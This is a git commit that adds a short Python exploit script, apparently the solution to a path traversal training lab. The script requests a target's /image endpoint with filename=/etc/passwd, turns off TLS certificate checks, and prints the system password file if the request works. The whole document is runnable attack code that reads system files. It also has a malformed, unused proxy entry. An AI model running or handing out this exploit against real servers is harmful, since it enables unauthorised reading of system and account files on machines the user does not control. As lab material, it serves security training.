aa51ba42a15becd2a456b3251903cd2a6d650609
Saher Scafi <mx-10101024@hotmail.com>
2026-02-07 11:09:49 -0500

    Add files via upload
    path traversal lab 2 exploit

---
+++ path_traveral_lab2.py
@@ -0,0 +1,33 @@
+import sys
+import requests
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0:8080"
+}
+
+def directory_traveral_exploit(url):
+    image_url = url + '/image?filename=/etc/passwd'
+    r = requests.get(image_url, verify=False)
+    if 'root:x' in r.text:
+        print(f"[+] Successfully retrieved the contents of /etc/passwd file:")
+        print(r.text)
+    else:
+        print(f"[-] Failed to retrieve the contents of /etc/passwd file")
+        sys.exit(1)
+
+def main():
+    if len(sys.argv) != 2:
+        print (f"Usage: {sys.argv[0]} <url>")
+        print (f"Example: {sys.argv[0]} http://example.com")
+        sys.exit(1)
+
+    url = sys.argv[1]
+    print (f"[*] Exploiting the directory traversal vulnerability of URL: {url}")
+    directory_traveral_exploit(url)
+  
+
+if __name__ == "__main__":
+    main()
